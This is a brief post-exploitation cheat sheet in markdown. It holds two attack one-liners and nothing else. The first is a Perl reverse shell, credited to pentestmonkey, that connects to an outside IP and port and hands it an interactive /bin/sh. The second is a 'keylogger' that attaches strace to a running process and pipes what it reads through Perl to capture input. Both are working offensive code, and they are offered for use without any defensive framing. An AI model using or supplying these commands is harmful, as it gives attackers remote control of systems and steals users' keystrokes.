# Perl Commands and Scripts for Post Exploitation

**Perl reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**

```perl 
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

**Running proc keylogger**
```perl
strace -p $PID -f -eread -o '| perl -ne'\"BEGIN{$|=1}my($i)=/\(0,"([^"]*)"/;print$i'\'```

